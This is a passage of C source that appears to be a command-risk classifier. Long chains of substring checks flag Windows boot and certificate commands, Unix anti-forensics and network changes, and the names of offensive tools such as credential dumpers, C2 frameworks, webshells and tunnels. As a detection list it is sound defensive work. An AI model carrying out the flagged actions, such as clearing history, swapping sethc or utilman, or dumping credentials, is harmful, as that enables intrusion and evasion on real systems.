                     ci_contains(text, "/novice") ||
                     ci_contains(text, "/expert"))) ||
                   ci_contains(text, "tsdiscon") ||
                   (ci_contains(text, "bcdedit") &&
                    (ci_contains(text, "/delete") ||
                     ci_contains(text, "/create") ||
                     ci_contains(text, "/set") ||
                     ci_contains(text, "/emssettings") ||
                     ci_contains(text, "/bootsequence") ||
                     ci_contains(text, "/default") ||
                     ci_contains(text, "/timeout") ||
                     ci_contains(text, "-set"))) ||
                   ci_contains(text, "bootsect") ||
                   (ci_contains(text, "bootrec") &&
                    (ci_contains(text, "/fix") ||
                     ci_contains(text, "/rebuild") ||
                     ci_contains(text, "/scanos"))) ||
                   ci_contains(text, "bcdboot") ||
                   (ci_contains(text, "certreq") &&
                    (ci_contains(text, "-submit") ||
                     ci_contains(text, "-retrieve") ||
                     ci_contains(text, "-new") ||
                     ci_contains(text, "-enroll") ||
                     ci_contains(text, "-config"))) ||
                   (ci_contains(text, "certutil") &&
                    (ci_contains(text, "-exportpfx") ||
                     ci_contains(text, "-importpfx") ||
                     ci_contains(text, "-addstore") ||
                     ci_contains(text, "-delstore") ||
                     ci_contains(text, "-key") ||
                     ci_contains(text, "-backup") ||
                     ci_contains(text, "-restorekey") ||
                     ci_contains(text, "-importcert") ||
                     ci_contains(text, "-delkey"))) ||
                   ci_contains(text, "pvk2pfx") ||
                   ci_contains(text, "pvkimprt") ||
                   (ci_contains(text, "signtool") &&
                    (ci_contains(text, " sign") ||
                     ci_contains(text, " timestamp"))) ||
                   (ci_contains(text, "nbtstat") &&
                    (ci_contains(text, " -a") || ci_contains(text, " -c") ||
                     ci_contains(text, " -s") || ci_contains(text, " -r"))) ||
                   (ci_contains(text, "ipconfig") &&
                    (ci_contains(text, "/displaydns") ||
                     ci_contains(text, "/flushdns"))) ||
                   ((ci_contains(text, "copy") ||
                     ci_contains(text, "move") ||
                     ci_contains(text, "replace") ||
                     ci_contains(text, "ren ")) &&
                    ci_contains(text, "system32") &&
                    (ci_contains(text, "utilman") ||
                     ci_contains(text, "sethc") ||
                     ci_contains(text, "osk") ||
                     ci_contains(text, "narrator") ||
                     ci_contains(text, "magnify") ||
                     ci_contains(text, "atbroker") ||
                     ci_contains(text, "displayswitch"))) ||
                   (ci_contains(text, "netsh") &&
                    (ci_contains(text, " trace") &&
                     (ci_contains(text, " start") ||
                      ci_contains(text, " stop")))) ||
                   (ci_contains(text, "netsh") &&
                    ci_contains(text, "http") &&
                    (ci_contains(text, "add urlacl") ||
                     ci_contains(text, "add sslcert") ||
                     ci_contains(text, "delete urlacl") ||
                     ci_contains(text, "delete sslcert"))) ||
                   (ci_contains(text, "netsh") &&
                    (ci_contains(text, "dnsclient") ||
                     ci_contains(text, "dnsserver")) &&
                    (ci_contains(text, " add") ||
                     ci_contains(text, " set"))) ||
                   (ci_contains(text, "wusa") &&
                    ci_contains(text, "/uninstall")) ||
                   (ci_contains(text, "dism") &&
                    (ci_contains(text, "/remove") ||
                     ci_contains(text, "/disable"))) ||
                   (ci_contains(text, "fltmc") &&
                    (ci_contains(text, "unload") ||
                     ci_contains(text, "detach"))) ||
                   ci_contains(text, "lodctr") ||
                   ci_contains(text, "unlodctr") ||
                   (ci_contains(text, "psr") &&
                    (ci_contains(text, " /") ||
                     ci_contains(text, " -"))) ||
                   (ci_contains(text, "sysprep") &&
                    (ci_contains(text, "/generalize") ||
                     ci_contains(text, "/oobe") ||
                     ci_contains(text, "/audit") ||
                     ci_contains(text, "/reboot"))) ||
                   (ci_contains(text, "netdom") &&
                    ci_contains(text, " "))) {
            what = "windows eventlog/defense/ad/boot/cert primitive";
        /* c242: unix net-config writes + audit/anti-forensics +
         * account file edits + selinux/dhcp/postfix + pkg removal ── */
        } else if ((ci_contains(text, "history") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -w") ||
                     ci_contains(text, " -d"))) ||
                   ci_contains(text, "unset histfile") ||
                   (ci_contains(text, "histfile=") &&
                    ci_contains(text, "null")) ||
                   (ci_contains(text, "crontab") &&
                    ci_contains(text, " -r")) ||
                   ci_contains(text, "atrm") ||
                   (ci_contains(text, "apt") &&
                    (ci_contains(text, " remove") ||
                     ci_contains(text, " purge"))) ||
                   (ci_contains(text, "yum") &&
                    (ci_contains(text, " remove") ||
                     ci_contains(text, " erase"))) ||
                   (ci_contains(text, "dnf") &&
                    (ci_contains(text, " remove") ||
                     ci_contains(text, " erase"))) ||
                   (ci_contains(text, "zypper") &&
                    (ci_contains(text, " rm") ||
                     ci_contains(text, " remove"))) ||
                   (ci_contains(text, "pacman") &&
                    (ci_contains(text, " -r") ||
                     ci_contains(text, " -rs"))) ||
                   (ci_contains(text, "apk") &&
                    ci_contains(text, " del")) ||
                   (ci_contains(text, "dpkg") &&
                    (ci_contains(text, " -r") ||
                     ci_contains(text, "--remove") ||
                     ci_contains(text, "--purge"))) ||
                   ci_contains(text, "vipw") || ci_contains(text, "vigr") ||
                   ci_contains(text, "pwunconv") ||
                   ci_contains(text, "grpunconv") ||
                   ci_contains(text, "newusers") ||
                   ci_contains(text, "deluser") ||
                   ci_contains(text, "delgroup") ||
                   ci_contains(text, "pam-auth-update") ||
                   ci_contains(text, "chcon") ||
                   (ci_contains(text, "audit2allow") &&
                    (ci_contains(text, " -a") || ci_contains(text, " -m") ||
                     ci_contains(text, " -l") || ci_contains(text, " -r") ||
                     ci_contains(text, "--all") ||
                     ci_contains(text, "--module"))) ||
                   ci_contains(text, "load_policy") ||
                   ci_contains(text, "semodule_package") ||
                   ci_contains(text, "semodule_link") ||
                   ci_contains(text, "semodule_expand") ||
                   ci_contains(text, "semodule_deps") ||
                   ci_contains(text, "setfiles") ||
                   (ci_contains(text, "dhclient") &&
                    (ci_contains(text, " -sf") ||
                     ci_contains(text, " -cf") ||
                     ci_contains(text, " -lf") ||
                     ci_contains(text, " -pf"))) ||
                   (ci_contains(text, "postconf") &&
                    ci_contains(text, " -e")) ||
                   (ci_contains(text, "postfix") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " flush") ||
                     ci_contains(text, " abort"))) ||
                   (ci_contains(text, "ipsec") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " down") ||
                     ci_contains(text, " reload") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, " route") ||
                     ci_contains(text, " unroute"))) ||
                   (ci_contains(text, "strongswan") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " down") ||
                     ci_contains(text, " purge"))) ||
                   (ci_contains(text, "conntrack") &&
                    (ci_contains(text, " -d") ||
                     ci_contains(text, " -f") ||
                     ci_contains(text, " -i"))) ||
                   ((ci_contains(text, "ip route") ||
                     ci_contains(text, "ip ro ")) &&
                    (ci_contains(text, " add") ||
                     ci_contains(text, " del") ||
                     ci_contains(text, " replace") ||
                     ci_contains(text, " flush") ||
                     ci_contains(text, " chang"))) ||
                   (ci_contains(text, "ip rule") &&
                    (ci_contains(text, " add") ||
                     ci_contains(text, " del") ||
                     ci_contains(text, " flush"))) ||
                   (ci_contains(text, "ip tunnel") &&
                    (ci_contains(text, " add") ||
                     ci_contains(text, " del") ||
                     ci_contains(text, " chang"))) ||
                   (ci_contains(text, "ip link") &&
                    ci_contains(text, " add ") &&
                    ci_contains(text, "type ") &&
                    (ci_contains(text, "bridge") ||
                     ci_contains(text, "veth") ||
                     ci_contains(text, "vxlan") ||
                     ci_contains(text, "macvlan") ||
                     ci_contains(text, "macvtap") ||
                     ci_contains(text, "macsec") ||
                     ci_contains(text, "dummy") ||
                     ci_contains(text, "ipip") ||
                     ci_contains(text, "gre") ||
                     ci_contains(text, "sit") ||
                     ci_contains(text, "vrf") ||
                     ci_contains(text, "vcan") ||
                     ci_contains(text, "vxcan") ||
                     ci_contains(text, "geneve") ||
                     ci_contains(text, "erspan") ||
                     ci_contains(text, "gretap") ||
                     ci_contains(text, "vti") ||
                     ci_contains(text, "nlmon") ||
                     ci_contains(text, "ipoib"))) ||
                   (ci_contains(text, "tc ") &&
                    (ci_contains(text, "mirred") ||
                     ci_contains(text, " ingress") ||
                     ci_contains(text, "redirect"))) ||
                   (ci_contains(text, "nft") &&
                    (ci_contains(text, "masquerade") ||
                     ci_contains(text, " redirect") ||
                     ci_contains(text, " dnat") ||
                     ci_contains(text, " snat") ||
                     ci_contains(text, " tproxy") ||
                     ci_contains(text, " add table") ||
                     ci_contains(text, " add chain"))) ||
                   (ci_contains(text, "firewall-cmd") &&
                    (ci_contains(text, "--permanent") ||
                     ci_contains(text, "--direct") ||
                     ci_contains(text, "--panic"))) ||
                   (ci_contains(text, "ufw") &&
                    (ci_contains(text, " disable") ||
                     ci_contains(text, " reset"))) ||
                   (ci_contains(text, "fail2ban-client") &&
                    (ci_contains(text, "unban") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " set "))) ||
                   (ci_contains(text, "bridge") &&
                    (ci_contains(text, " fdb ") ||
                     ci_contains(text, " vlan ") ||
                     ci_contains(text, " link ")) &&
                    (ci_contains(text, " add") ||
                     ci_contains(text, " del") ||
                     ci_contains(text, " append") ||
                     ci_contains(text, " replace") ||
                     ci_contains(text, " set"))) ||
                   ci_contains(text, "ovs-vsctl") ||
                   (ci_contains(text, "ovs-ofctl") &&
                    (ci_contains(text, "add-flow") ||
                     ci_contains(text, "del-flow") ||
                     ci_contains(text, "mod-flow") ||
                     ci_contains(text, "bundle") ||
                     ci_contains(text, "replace"))) ||
                   (ci_contains(text, "ovs-dpctl") &&
                    (ci_contains(text, "add") ||
                     ci_contains(text, "del") ||
                     ci_contains(text, "flush"))) ||
                   (ci_contains(text, "ethtool") &&
                    ci_contains(text, " -s ")) ||
                   ci_contains(text, "hostapd") ||
                   ci_contains(text, "airbase-ng") ||
                   ci_contains(text, "aireplay-ng") ||
                   ci_contains(text, "aircrack-ng") ||
                   (ci_contains(text, "reaver") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "bully") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "mdk3") || ci_contains(text, "mdk4") ||
                   ci_contains(text, "wifite") ||
                   ci_contains(text, "fluxion") ||
                   ci_contains(text, "eaphammer") ||
                   ci_contains(text, "kismet") ||
                   (ci_contains(text, "responder") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "mitm6") ||
                   ci_contains(text, "ntlmrelayx") ||
                   ci_contains(text, "impacket-") ||
                   ci_contains(text, "secretsdump") ||
                   ci_contains(text, "psexec") ||
                   ci_contains(text, "wmiexec") ||
                   ci_contains(text, "smbexec") ||
                   ci_contains(text, "atexec") ||
                   ci_contains(text, "dcomexec") ||
                   ci_contains(text, "addcomputer") ||
                   ci_contains(text, "rbcd") ||
                   ci_contains(text, "dacledit") ||
                   ci_contains(text, "shadowcoerce") ||
                   ci_contains(text, "petitpotam") ||
                   ci_contains(text, "ticketer") ||
                   ci_contains(text, "raisechild") ||
                   ci_contains(text, "getst") ||
                   ci_contains(text, "getnpusers") ||
                   ci_contains(text, "getadusers") ||
                   ci_contains(text, "lookupsid") ||
                   ci_contains(text, "samrdump") ||
                   ci_contains(text, "rpcdump") ||
                   ci_contains(text, "netview") ||
                   ci_contains(text, "finddelegation") ||
                   ci_contains(text, "getpac") ||
                   ci_contains(text, "goldenpac") ||
                   ci_contains(text, "krbrelayx") ||
                   ci_contains(text, "whisker") ||
                   ci_contains(text, "adidnsdump") ||
                   ci_contains(text, "dnstool") ||
                   ci_contains(text, "coercer") ||
                   ci_contains(text, "dpapi") ||
                   ci_contains(text, "sharpdpapi") ||
                   ci_contains(text, "sharpsccm") ||
                   ci_contains(text, "sccmhunter") ||
                   ci_contains(text, "azurehound") ||
                   ci_contains(text, "roadrecon") ||
                   ci_contains(text, "stormspotter")) {
            what = "unix net-config/audit/account/package primitive";
        /* c242: offensive tool names — scan/brute/exploit/c2/webshell/
         * cred-dump/privesc/k8s-attack/fleet-exec/tunnel families ── */
        } else if ((ci_contains(text, "nmap") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "masscan") ||
                   ci_contains(text, "zmap") || ci_contains(text, "zgrab") ||
                   ci_contains(text, "rustscan") ||
                   ci_contains(text, "naabu") ||
                   ci_contains(text, "hping") ||
                   ci_contains(text, "arping") ||
                   (ci_contains(text, "fping") &&
                    ci_contains(text, " -g")) ||
                   ci_contains(text, "unicornscan") ||
                   ci_contains(text, "dnsrecon") ||
                   ci_contains(text, "fierce") ||
                   ci_contains(text, "dnsenum") ||
                   ci_contains(text, "dnsmap") ||
                   ci_contains(text, "massdns") ||
                   ci_contains(text, "subbrute") ||
                   ci_contains(text, "sublist3r") ||
                   ci_contains(text, "amass") ||
                   ci_contains(text, "subfinder") ||
                   ci_contains(text, "assetfinder") ||
                   ci_contains(text, "findomain") ||
                   ci_contains(text, "httprobe") ||
                   ci_contains(text, "httpx") ||
                   (ci_contains(text, "gau") &&
                    ci_contains(text, " ")) ||
                   ci_contains(text, "waybackurls") ||
                   ci_contains(text, "katana") ||
                   ci_contains(text, "hakrawler") ||
                   ci_contains(text, "gospider") ||
                   ci_contains(text, "gobuster") ||
                   ci_contains(text, "ffuf") ||
                   ci_contains(text, "dirb") ||
                   ci_contains(text, "dirsearch") ||
                   ci_contains(text, "feroxbuster") ||
                   ci_contains(text, "wfuzz") ||
                   ci_contains(text, "nuclei") ||
                   (ci_contains(text, "nikto") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "wpscan") ||
                   ci_contains(text, "joomscan") ||
                   ci_contains(text, "droopescan") ||
                   ci_contains(text, "cmsmap") ||
                   ci_contains(text, "sqlmap") ||
                   ci_contains(text, "ghauri") ||
                   ci_contains(text, "commix") ||
                   ci_contains(text, "nosqlmap") ||
                   ci_contains(text, "xsstrike") ||
                   ci_contains(text, "dalfox") ||
                   ci_contains(text, "skipfish") ||
                   ci_contains(text, "w3af") ||
                   ci_contains(text, "arachni") ||
                   ci_contains(text, "wapiti") ||
                   ci_contains(text, "zaproxy") ||
                   ci_contains(text, "burpsuite") ||
                   ci_contains(text, "arjun") ||
                   ci_contains(text, "paramspider") ||
                   ci_contains(text, "kiterunner") ||
                   (ci_contains(text, "hydra") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "medusa") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "ncrack") ||
                   ci_contains(text, "patator") ||
                   (ci_contains(text, "crowbar") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "kerbrute") ||
                   ci_contains(text, "hashcat") ||
                   (ci_contains(text, "john") &&
                    ci_contains(text, " --")) ||
                   ci_contains(text, "chntpw") ||
                   ci_contains(text, "searchsploit") ||
                   ci_contains(text, "routersploit") ||
                   ci_contains(text, "getsploit") ||
                   ci_contains(text, "whatweb") ||
                   ci_contains(text, "p0f") ||
                   ci_contains(text, "amap") ||
                   ci_contains(text, "heartleech") ||
                   ci_contains(text, "swaks") ||
                   ci_contains(text, "sipvicious") ||
                   ci_contains(text, "svmap") ||
                   ci_contains(text, "svwar") ||
                   ci_contains(text, "svcrack") ||
                   ci_contains(text, "sngrep") ||
                   ci_contains(text, "tcpreplay") ||
                   ci_contains(text, "tcprewrite") ||
                   ci_contains(text, "bittwist") ||
                   ci_contains(text, "bittwiste") ||
                   ci_contains(text, "packeth") ||
                   ci_contains(text, "scapy") ||
                   ci_contains(text, "ysoserial") ||
                   ci_contains(text, "msfvenom") ||
                   ci_contains(text, "msfconsole") ||
                   ci_contains(text, "meterpreter") ||
                   ci_contains(text, "shellter") ||
                   (ci_contains(text, "veil") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "powercat") ||
                   ci_contains(text, "teamserver") ||
                   ci_contains(text, "cobaltstrike") ||
                   ci_contains(text, "brute-ratel") ||
                   ci_contains(text, "brc4") ||
                   ci_contains(text, "koadic") ||
                   ci_contains(text, "starkiller") ||
                   ci_contains(text, "apfell") ||
                   ci_contains(text, "trevorc2") ||
                   ci_contains(text, "gcat") ||
                   ci_contains(text, "poshc2") ||
                   ci_contains(text, "shad0w") ||
                   (ci_contains(text, "deimos") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "godzilla") ||
                   ci_contains(text, "behinder") ||
                   ci_contains(text, "antsword") ||
                   ci_contains(text, "weevely") ||
                   ci_contains(text, "b374k") ||
                   ci_contains(text, "p0wny") ||
                   ci_contains(text, "alfashell") ||
                   ci_contains(text, "c99shell") ||
                   ci_contains(text, "wso.php") ||
                   ci_contains(text, "r57") ||
                   ci_contains(text, "lazagne") ||
                   ci_contains(text, "mimipenguin") ||
                   ci_contains(text, "linikatz") ||
                   ci_contains(text, "pypykatz") ||
                   ci_contains(text, "lsassy") ||
                   ci_contains(text, "gsecdump") ||
                   ci_contains(text, "pwdump") ||
                   ci_contains(text, "fgdump") ||
                   ci_contains(text, "cachedump") ||
                   (ci_contains(text, "wce") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "nanodump") ||
                   ci_contains(text, "handlekatz") ||
                   ci_contains(text, "mirrordump") ||
                   ci_contains(text, "sqldumper") ||
                   ci_contains(text, "createdump") ||
                   (ci_contains(text, "comsvcs") &&
                    ci_contains(text, "minidump")) ||
                   ci_contains(text, "linpeas") ||
                   (ci_contains(text, "linenum") &&
                    !ci_contains(text, "linenumber")) ||
                   ci_contains(text, "linux-exploit-suggester") ||
                   ci_contains(text, "unix-privesc-check") ||
                   ci_contains(text, "linuxprivchecker") ||
                   ci_contains(text, "pspy") ||
                   ci_contains(text, "winpeas") ||
                   ci_contains(text, "wesng") ||
                   (ci_contains(text, "powerup") &&
                    (ci_contains(text, " -") ||
                     ci_contains(text, ".ps1"))) ||
                   ci_contains(text, "sharpup") ||
                   ci_contains(text, "beroot") ||
                   ci_contains(text, "juicypotato") ||
                   ci_contains(text, "rottenpotato") ||
                   ci_contains(text, "godpotato") ||
                   ci_contains(text, "printspoofer") ||
                   ci_contains(text, "roguepotato") ||
                   ci_contains(text, "sweetpotato") ||
                   ci_contains(text, "efspotato") ||
                   ci_contains(text, "genericpotato") ||
                   ci_contains(text, "badpotato") ||
                   ci_contains(text, "hotpotato") ||
                   ci_contains(text, "sharpprintspoofer") ||
                   ci_contains(text, "juicypotatong") ||
                   ci_contains(text, "kube-hunter") ||
                   ci_contains(text, "peirates") ||
                   ci_contains(text, "kubesploit") ||
                   ci_contains(text, "kdigger") ||
                   ci_contains(text, "deepce") ||
                   ci_contains(text, "amicontained") ||
                   (ci_contains(text, "chisel") &&
                    (ci_contains(text, " client") ||
                     ci_contains(text, " server") || ci_contains(text, " -"))) ||
                   ci_contains(text, "ligolo") ||
                   (ci_contains(text, "gost") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "frpc") || ci_contains(text, "frps") ||
                   (ci_contains(text, "rathole") &&
                    (ci_contains(text, " -") || ci_contains(text, ".toml"))) ||
                   ci_contains(text, "websocat") ||
                   (ci_contains(text, "iodine") &&
                    ci_contains(text, " -f")) ||
                   ci_contains(text, "dnscat") ||
                   ci_contains(text, "dns2tcp") ||
                   ci_contains(text, "icmpsh") ||
                   ci_contains(text, "ptunnel") ||
                   ci_contains(text, "pingtunnel") ||
                   ci_contains(text, "udp2raw") ||
                   ci_contains(text, "kcptun") ||
                   ci_contains(text, "v2ray") ||
                   (ci_contains(text, "xray") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " -c"))) ||
                   (ci_contains(text, "trojan") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -l"))) ||
                   ci_contains(text, "ss-server") ||
                   ci_contains(text, "ss-local") ||
                   ci_contains(text, "ssr-local") ||
                   ci_contains(text, "ss-manager") ||
                   (ci_contains(text, "hysteria") &&
                    (ci_contains(text, " server") ||
                     ci_contains(text, " client") ||
                     ci_contains(text, " -"))) ||
                   (ci_contains(text, "clash") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "stunnel") ||
                   ci_contains(text, "sslh") ||
                   ci_contains(text, "proxytunnel") ||
                   ci_contains(text, "httptunnel") ||
                   ci_contains(text, "torsocks") ||
                   ci_contains(text, "torify") ||
                   ci_contains(text, "eggdrop") ||
                   ci_contains(text, "psybnc") ||
                   (ci_contains(text, "znc") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "ezbounce") ||
                   ci_contains(text, "pssh") || ci_contains(text, "pdsh") ||
                   ci_contains(text, "clush") || ci_contains(text, "mussh") ||
                   ci_contains(text, "parallel-ssh") ||
                   ci_contains(text, "sshpass") ||
                   (ci_contains(text, "expect") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "ansible") &&
                    (ci_contains(text, "-m command") ||
                     ci_contains(text, "-m shell") ||
                     ci_contains(text, "-m raw") ||
                     ci_contains(text, "-m script"))) ||
                   (ci_contains(text, "salt") &&
                    (ci_contains(text, "cmd.run") ||
                     ci_contains(text, "cmd.shell") ||
                     ci_contains(text, "state "))) ||
                   (ci_contains(text, "salt-call") &&
                    (ci_contains(text, "cmd.run") ||
                     ci_contains(text, "state"))) ||
                   ci_contains(text, "salt-ssh") ||
                   (ci_contains(text, "salt-key") &&
                    (ci_contains(text, " -a") ||
                     ci_contains(text, " -d"))) ||
                   (ci_contains(text, "chef") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " apply") ||
                     ci_contains(text, " -z"))) ||
                   (ci_contains(text, "puppet") &&
                    (ci_contains(text, " apply") ||
                     ci_contains(text, " agent"))) ||
                   (ci_contains(text, "bolt") &&
                    (ci_contains(text, " command") ||
                     ci_contains(text, " task") ||
                     ci_contains(text, " plan")))) {
            what = "offensive-tool/recon/c2/webshell/cred-dump name";
        /* c242: infra/cloud-writes + container/virt + ipmi/tpm +
         * cred-store + db-edit + mac ops + capture/clipboard +
         * forensics ── */
        } else if ((ci_contains(text, "kubectl") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " cp ") ||
                     ci_contains(text, " port-forward") ||
                     ci_contains(text, " debug") ||
                     ci_contains(text, " drain") ||
                     ci_contains(text, " cordon") ||
                     ci_contains(text, " attach") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " taint") ||
                     ci_contains(text, " label") ||
                     ci_contains(text, " annotate"))) ||
                   (ci_contains(text, "kubeadm") &&
                    (ci_contains(text, " reset") ||
                     ci_contains(text, " token"))) ||
                   (ci_contains(text, "helm") &&
                    (ci_contains(text, " uninstall") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " rollback"))) ||
                   (ci_contains(text, "oc ") &&
                    (ci_contains(text, " rsh") ||
                     ci_contains(text, " exec") ||
                     ci_contains(text, " debug") ||
                     ci_contains(text, " port-forward"))) ||
                   (ci_contains(text, "runc") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " exec") ||
                     ci_contains(text, " create"))) ||
                   (ci_contains(text, "runsc ") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " exec") ||
                     ci_contains(text, " create"))) ||
                   (ci_contains(text, "crictl") &&
                    (ci_contains(text, "exec") || ci_contains(text, "runp") ||
                     ci_contains(text, "stop") || ci_contains(text, "rmp") ||
                     ci_contains(text, " rm"))) ||
                   (ci_contains(text, "buildah") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " from") ||
                     ci_contains(text, " mount") ||
                     ci_contains(text, " umount"))) ||
                   (ci_contains(text, "podman") &&
                    (ci_contains(text, "exec") ||
                     ci_contains(text, "--privileged") ||
                     ci_contains(text, "--pid=host") ||
                     ci_contains(text, "--net=host") ||
                     ci_contains(text, "--ipc=host") ||
                     ci_contains(text, " cp") ||
                     ci_contains(text, " volume"))) ||
                   (ci_contains(text, "nerdctl") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " run"))) ||
                   (ci_contains(text, "lxc") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " launch") ||
                     ci_contains(text, " config") ||
                     ci_contains(text, " copy") ||
                     ci_contains(text, " publish"))) ||
                   (ci_contains(text, "incus") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " launch") ||
                     ci_contains(text, " config"))) ||
                   (ci_contains(text, "virsh") &&
                    (ci_contains(text, " start") ||
                     ci_contains(text, " destroy") ||
                     ci_contains(text, " undefine") ||
                     ci_contains(text, " snapshot") ||
                     ci_contains(text, " dumpxml") ||
                     ci_contains(text, " edit") ||
                     ci_contains(text, " define") ||
                     ci_contains(text, " console") ||
                     ci_contains(text, " net-"))) ||
                   (ci_contains(text, "vboxmanage") &&
                    (ci_contains(text, "controlvm") ||
                     ci_contains(text, "modifyvm") ||
                     ci_contains(text, "unregistervm") ||
                     ci_contains(text, "startvm") ||
                     ci_contains(text, "snapshot") ||
                     ci_contains(text, "dhcpserver") ||
                     ci_contains(text, "sharedfolder"))) ||
                   ci_contains(text, "guestfish") ||
                   ci_contains(text, "guestmount") ||
                   ci_contains(text, "virt-edit") ||
                   ci_contains(text, "virt-customize") ||
                   ci_contains(text, "virt-rescue") ||
                   ci_contains(text, "virt-cat") ||
                   ci_contains(text, "virt-tar") ||
                   ci_contains(text, "virt-df") ||
                   ci_contains(text, "virt-inspector") ||
                   ci_contains(text, "virt-log") ||
                   ci_contains(text, "qemu-nbd") ||
                   ci_contains(text, "nbdkit") ||
                   ci_contains(text, "targetcli") ||
                   ci_contains(text, "tgtadm") ||
                   (ci_contains(text, "iscsiadm") &&
                    (ci_contains(text, " -l") ||
                     ci_contains(text, "--login") ||
                     ci_contains(text, "--logout") ||
                     ci_contains(text, " -m node"))) ||
                   (ci_contains(text, "drbdadm") &&
                    (ci_contains(text, "primary") ||
                     ci_contains(text, "disconnect") ||
                     ci_contains(text, "down") ||
                     ci_contains(text, "secondary") ||
                     ci_contains(text, "invalidate"))) ||
                   (ci_contains(text, "losetup") &&
                    (ci_contains(text, " -f") ||
                     ci_contains(text, " /dev/loop") ||
                     ci_contains(text, " -p") ||
                     ci_contains(text, " -o"))) ||
                   (ci_contains(text, "mknod") &&
                    ci_contains(text, "/dev/")) ||
                   ci_contains(text, "debugfs") ||
                   ci_contains(text, "xfsdump") ||
                   ci_contains(text, "xfsrestore") ||
                   ci_contains(text, "extundelete") ||
                   ci_contains(text, "ext4magic") ||
                   ci_contains(text, "ntfsundelete") ||
                   ci_contains(text, "testdisk") ||
                   ci_contains(text, "photorec") ||
                   ci_contains(text, "bulk_extractor") ||
                   (ci_contains(text, "volatility") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "volatility3") ||
                   ci_contains(text, "rekall") ||
                   ci_contains(text, "avml") ||
                   ci_contains(text, "linpmem") ||
                   ci_contains(text, "winpmem") ||
                   ci_contains(text, "osxpmem") ||
                   (ci_contains(text, "srm") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "wipe ") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "bleachbit") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "bcwipe") ||
                   (ci_contains(text, "exiftool") &&
                    ci_contains(text, "-all=")) ||
                   ci_contains(text, "steghide") ||
                   ci_contains(text, "binwalk") ||
                   ci_contains(text, "httrack") ||
                   ci_contains(text, "fswebcam") ||
                   ci_contains(text, "uvccapture") ||
                   (ci_contains(text, "streamer") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "v4l2-ctl") &&
                    ci_contains(text, "--stream")) ||
                   (ci_contains(text, "gst-launch") &&
                    (ci_contains(text, "ximagesrc") ||
                     ci_contains(text, "pulsesrc") ||
                     ci_contains(text, "v4l2src") ||
                     ci_contains(text, "avfvideosrc") ||
                     ci_contains(text, "dshowvideosrc") ||
                     ci_contains(text, "alsasrc") ||
                     ci_contains(text, "osxvideosrc") ||
                     ci_contains(text, "autovideosrc") ||
                     ci_contains(text, "audiotestsrc"))) ||
                   ci_contains(text, "raspistill") ||
                   ci_contains(text, "raspivid") ||
                   ci_contains(text, "libcamera-still") ||
                   ci_contains(text, "libcamera-vid") ||
                   ci_contains(text, "imagesnap") ||
                   ci_contains(text, "videosnap") ||
                   ci_contains(text, "recordmydesktop") ||
                   (ci_contains(text, "xclip") &&
                    (ci_contains(text, " -o") || ci_contains(text, "-sel"))) ||
                   (ci_contains(text, "xsel") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "wl-paste") ||
                   ci_contains(text, "wl-copy") ||
                   ci_contains(text, "pbcopy") ||
                   ci_contains(text, "conspy") ||
                   ci_contains(text, "sudoreplay") ||
                   ci_contains(text, "reptyr") ||
                   (ci_contains(text, "perf") &&
                    (ci_contains(text, " trace") ||
                     ci_contains(text, " record"))) ||
                   ci_contains(text, "lttng") ||
                   (ci_contains(text, "trace-cmd") &&
                    (ci_contains(text, " record") ||
                     ci_contains(text, " start"))) ||
                   (ci_contains(text, "dtrace") &&
                    (ci_contains(text, " -n") ||
                     ci_contains(text, " -s") ||
                     ci_contains(text, " -q") ||
                     ci_contains(text, " -c"))) ||
                   ci_contains(text, "dtruss") ||
                   ci_contains(text, "fs_usage") ||
                   ci_contains(text, "spindump") ||
                   ci_contains(text, "sysdiagnose") ||
                   ci_contains(text, "opensnoop") ||
                   ci_contains(text, "execsnoop") ||
                   ci_contains(text, "iosnoop") ||
                   ci_contains(text, "rwsnoop") ||
                   ci_contains(text, "tcpsnoop") ||
                   ci_contains(text, "killsnoop") ||
                   ci_contains(text, "bitesize") ||
                   (ci_contains(text, "log") &&
                    (ci_contains(text, " erase") ||
                     ci_contains(text, " collect"))) ||
                   (ci_contains(text, "plutil") &&
                    (ci_contains(text, " -insert") ||
                     ci_contains(text, " -replace") ||
                     ci_contains(text, " -remove") ||
                     ci_contains(text, " -extract"))) ||
                   (ci_contains(text, "mdutil") &&
                    (ci_contains(text, " -e") ||
                     ci_contains(text, " -i"))) ||
                   (ci_contains(text, "tmutil") &&
                    (ci_contains(text, "delete") ||
